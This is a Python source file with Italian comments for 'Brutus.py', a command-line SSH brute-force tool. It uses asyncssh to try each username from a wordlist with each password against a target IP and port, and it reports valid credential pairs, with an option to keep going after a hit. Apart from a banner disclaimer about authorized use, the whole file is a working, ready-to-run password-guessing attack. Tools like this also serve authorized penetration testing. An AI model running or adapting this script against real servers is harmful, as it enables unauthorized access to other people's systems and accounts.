#!/usr/bin/env python3

# IMPORT DELLE LIBRERIE

import asyncio
import asyncssh
import argparse
import ipaddress
import os

print('')
print('██████╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗███████╗   ██████╗ ██╗   ██╗')
print('██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║   ██║██╔════╝   ██╔══██╗╚██╗ ██╔╝')
print('██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║███████╗   ██████╔╝ ╚████╔╝') 
print('██╔══██╗██╔══██╗██║   ██║   ██║   ██║   ██║╚════██║   ██╔═══╝   ╚██╔╝')  
print('██████╔╝██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║██╗██║        ██║')   
print('╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝╚═╝        ╚═╝')   
print('')
print('Brutus.py is a tool designed for security testing of SSH services. It allows users to test a single username and/or password, ')
print('or use wordlists for usernames and passwords to perform cluster bomb-style attacks - Created by p3qu0dd')
print('')
print('--------------------------------------------------------------------------------------------------------------------------------------')
print('')
print('DISCLAIMER:')
print('This tool is intended for ethical use only. The author assumes no responsibility for any misuse of this software. ')
print('Testing SSH services or any systems without explicit authorization is illegal and may result in criminal or civil penalties.')
print('')
print('--------------------------------------------------------------------------------------------------------------------------------------')
print('')

# ABBELLIRE IL MENU HELP

class PrettyFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=55, width=125)
        
# VERIFICA IL FORMATO DELL'INDIRIZZO IP

def check_ip_format(ip_string):
    try:
        ipaddress.ip_address(ip_string)
        return ip_string
    except ValueError:
        raise argparse.ArgumentTypeError("Invalid IP address!")

# VERIFICA CHE VENGA INSERITO UN NUMERO E CHE STIA TRA 1 E 65535

def check_port_format(port_number):
    try:
        port = int(port_number)
    except ValueError:
        raise argparse.ArgumentTypeError("Port must be a number!")
    if not (1 <= port <= 65535):
        raise argparse.ArgumentTypeError("Port must be between 1 and 65535!")
    return port

# VERIFICA CHE PRENDA UN FILE COME ARGOMENTO

def check_file(file_path):
    if not os.path.isfile(file_path):
        raise argparse.ArgumentTypeError("Invalid file!")
    return file_path

# VERIFICA CHE NON PRENDA UN FILE COME ARGOMENTO

def check_string(value):
    if os.path.isfile(value):
        raise argparse.ArgumentTypeError("Invalid argument! Cannot be a file!")
    return value

# ARGOMENTI CHE IL PROGRAMMA PRENDE IN INPUT DA CLI
                                                               
def arguments():

    parser = argparse.ArgumentParser(usage = 'python3 brutus.py -i [TARGET IP] [OPTIONS]', formatter_class=PrettyFormatter)
    parser.add_argument('-i', '--ip', dest='host', metavar='<IP address>', type=check_ip_format, help='target IP address')
    parser.add_argument('-s', '--service', dest='port', metavar='<port>', type=check_port_format, help='target port (default 22)', default=22)
    parser.add_argument('-u', '--username', dest='user', metavar='<username>', type=check_string, help='username')
    parser.add_argument('-p', '--password', dest='passwd', metavar='<password>', type=check_string, help='password')
    parser.add_argument('-U', '--userlist', dest='users_list', metavar='<username list>', type=check_file, help='username list')
    parser.add_argument('-P', '--passlist', dest='passwords_list', metavar='<password list>', type=check_file, help='password list')
    parser.add_argument('--dont-stop', dest='dont_stop', action='store_true', help='keeps on searching even when a valid combination of credentials has been found')

    args = parser.parse_args()

# ERROR HANDLING
    
    if not args.host:
        print('\n[-] Please specify a target IP - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')
    elif not args.user and not args.users_list:
        print('\n[-] Please specify a username or a user list - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')
    elif not args.passwd and not args.passwords_list:
        print('\n[-] Please specify a password or a password list - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')

    return args

args = arguments()

# SE VIENE INSERITA UNA WORDLIST LE VARIE LINEE VENGONO PRESE ED AGGIUNTE ALLA LISTA PASSWORDS

passwords=[]

def pass_list(passwords_list_path):
    global passwords

    try:
        with open(passwords_list_path, 'r') as file:
            for line in file:
                password = line.strip()
                if password:
                    passwords.append(password)
    except FileNotFoundError:
        print('[!] Wordlist not found or invalid path')
        return []
    return passwords

if args.passwords_list:
    passwords = pass_list(args.passwords_list)

# SE VIENE INSERITA UNA PASSWORD SINGOLA LA AGGIUNGE ALLA LISTA PASSWORD

def single_pass(passwd):
    global passwords
    passwords.append(passwd)
    return passwords

if args.passwd:
    passwords = single_pass(args.passwd)

# SE VIENE INSERITA UNA WORDLIST LE VARIE LINEE VENGONO PRESE ED AGGIUNTE ALLA LISTA USERNAMES

usernames=[]

def user_list(users_list_path):
    global usernames

    try:
        with open(users_list_path, 'r') as file:
            for line in file:
                username = line.strip()
                if username:
                    usernames.append(username)
    except FileNotFoundError:
        print('[!] Wordlist not found or invalid path!')
        return []
    return usernames

if args.users_list:
    usernames = user_list(args.users_list)

# SE VIENE INSERITO UNO USERNAME SINGOLO LO AGGIUNGE ALLA LISTA USERNAMES

def single_username(user):
    global usernames
    usernames.append(user)
    return usernames

if args.user:
    usernames = single_username(args.user)

# LOOP DI CONNESSIONE SSH

async def ssh_login(host, port, passwords, usernames):
    for x in usernames: 
            for i in passwords:
                try:
                    async with await asyncio.wait_for(asyncssh.connect(host=host, port=port, password=i, username=x), timeout=10) as conn:
                        if conn:
                            print('\033[92m[+] Testing password ' + '"' + i + '"' + ' for the user '  + '"' + x + '" - Valid password!\033[0m')
                            if args.dont_stop: # SE VIENE UTILIZZATO LO SWITCH --DONT-STOP IL PROGRAMMA CONTINUA ANCHE SE TROVA UNA COMBINAZIONE DI CREDENZIALI VALIDA
                                continue
                            return True
                        elif not conn:
                            continue
                except (asyncssh.ProcessError, asyncssh.PermissionDenied):
                    print('[-] Testing password ' + '"' + i + '"' + ' for the user '  + '"' + x + '" - Invalid password!')
                    continue
                except asyncio.TimeoutError:
                    print('[!] Connection timeout! The provided IP could be not valid or the port could be closed!')
                    continue
                except (OSError, asyncssh.Error) as e:
                    print('[!] Connection failed. Check the target\'s IP/Port!') # IL PROGRAMMA SI INTERROMPE IN CONNECTION TIMEOUT
                    return False
            continue

# USCITA PULITA SE IL PROGRAMMA VIENE INTERROTTO DALL'UTENTE

try:
    asyncio.run(ssh_login(args.host, int(args.port), passwords, usernames))
except KeyboardInterrupt:
    print(' - [!] Stopped by the user! Goodbye!')
